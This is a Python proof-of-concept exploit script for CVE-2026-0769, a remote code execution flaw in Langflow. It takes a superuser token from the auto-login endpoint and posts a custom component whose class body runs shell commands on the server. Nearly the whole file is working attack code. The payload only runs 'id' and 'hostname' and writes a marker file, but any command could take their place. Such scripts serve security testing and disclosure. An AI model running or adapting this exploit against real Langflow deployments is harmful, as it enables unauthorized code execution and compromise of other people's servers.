#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Langflow Eval Injection RCE — Vector 2 (Class-Body Exec)
# CVE            : CVE-2026-0769
# Vendor         : langflow-ai
# Product        : Langflow
# Affected       : 1.0.0 through 1.8.0 (latest)
# Type           : CWE-95 - Eval Injection
# CVSS           : 9.8 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-01-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-0769 Vector 2: Class-Body Code Execution

Demonstrates RCE via code placed in the CLASS BODY rather than at module level.
This exercises a DIFFERENT exec() call path:
  - Module-level code → prepare_global_scope() exec() at validate.py:293
  - Class-body code  → build_class_constructor() exec() at validate.py:338 (THIS VECTOR)

ATTACK CHAIN:
  1. GET /api/v1/auto_login → obtain superuser JWT
  2. POST /api/v1/custom_component with class-body RCE payload
  3. build_class_constructor() at validate.py:338 exec()'s class-body code

PREREQUISITES:
  - Target running Langflow 1.0.0–1.8.0 with AUTO_LOGIN=True (default)
  - Network access to port 7860

REFERENCES:
  - CVE-2026-0769
  - https://www.zerodayinitiative.com/advisories/ZDI-26-035/
"""

import json
import sys
import urllib.request
import urllib.error
import uuid
import subprocess
import time

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 7860
MARKER = "CVE-2026-0769-CLASSBODY-" + uuid.uuid4().hex[:8]
MARKER_FILE = "/tmp/cve-2026-0769-classbody-marker"


def get_auth_token(base_url):
    """Obtain superuser JWT via auto_login."""
    url = base_url + "/api/v1/auto_login"
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode())
        return data["access_token"]


def exploit(target_host, target_port, container_name="cve-2026-0769-vulnerable"):
    """
    Exploit CVE-2026-0769 via CLASS-BODY code execution.

    Instead of placing malicious code at module level, we place it inside
    the class body as class-level assignments. These are executed by
    build_class_constructor() at validate.py:338 via exec().
    """
    base_url = "http://" + target_host + ":" + str(target_port)

    print("=" * 60)
    print("  CVE-2026-0769 Vector 2: Class-Body Exec RCE")
    print("  Target: " + base_url)
    print("  Exec path: build_class_constructor() at validate.py:338")
    print("=" * 60)
    print()

    # Step 1: Auth
    print("[*] Getting auth token...")
    token = get_auth_token(base_url)
    print("[+] Got token: " + token[:40] + "...")

    # Step 2: Build payload with RCE in CLASS BODY
    # The malicious code is inside the class as class-level assignments.
    # These execute when build_class_constructor() calls exec() on the
    # compiled class definition.
    payload = (
        "import os\n"
        "import subprocess\n"
        "\n"
        "from langflow.custom import Component\n"
        "from langflow.io import Output\n"
        "\n"
        "class ExploitClassBody(Component):\n"
        "    display_name = \"Class Body Exploit\"\n"
        "    description = \"RCE in class body\"\n"
        "\n"
        "    # --- RCE happens HERE, in the class body ---\n"
        "    # These class-level assignments execute during build_class_constructor()\n"
        "    _rce_id = subprocess.check_output([\"id\"], text=True).strip()\n"
        "    _rce_hostname = subprocess.check_output([\"hostname\"], text=True).strip()\n"
        "    _rce_write = open(\"" + MARKER_FILE + "\", \"w\").write(\n"
        "        \"" + MARKER + "\\n\"\n"
        "        \"exec_path: build_class_constructor() at validate.py:338\\n\"\n"
        "        \"id: \" + subprocess.check_output([\"id\"], text=True).strip() + \"\\n\"\n"
        "        \"hostname: \" + subprocess.check_output([\"hostname\"], text=True).strip() + \"\\n\"\n"
        "    )\n"
        "\n"
        "    outputs = [Output(name=\"output\", display_name=\"Output\", method=\"run\")]\n"
        "    def run(self) -> str:\n"
        "        return \"exploited\"\n"
    )

    print("[*] Sending class-body exploit payload...")
    print("[*] Marker: " + MARKER)

    body = json.dumps({"code": payload}).encode("utf-8")
    headers = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json",
    }

    url = base_url + "/api/v1/custom_component"
    try:
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=30) as resp:
            print("[+] HTTP " + str(resp.status) + " response received")
    except urllib.error.HTTPError as e:
        print("[!] HTTP " + str(e.code) + ": " + str(e.reason) + " (code may still have executed)")

    # Step 3: Verify
    time.sleep(0.5)
    print("[*] Verifying exploitation...")
    result = subprocess.run(
        ["docker", "exec", container_name, "cat", MARKER_FILE],
        capture_output=True, text=True, timeout=10
    )

    if result.returncode == 0 and MARKER in result.stdout:
        print("[+] =============================================")
        print("[+]  CONFIRMED: Class-body code execution works!")
        print("[+]  exec() path: build_class_constructor():338")
        print("[+] =============================================")
        for line in result.stdout.strip().split("\n"):
            print("[+] " + line)
        # Cleanup
        subprocess.run(["docker", "exec", container_name, "rm", "-f", MARKER_FILE],
                       capture_output=True, timeout=5)
        return True
    else:
        print("[-] Class-body execution not confirmed")
        print("[-] stderr: " + result.stderr.strip())
        return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else "cve-2026-0769-vulnerable"
    success = exploit(target, port, container)
    sys.exit(0 if success else 1)
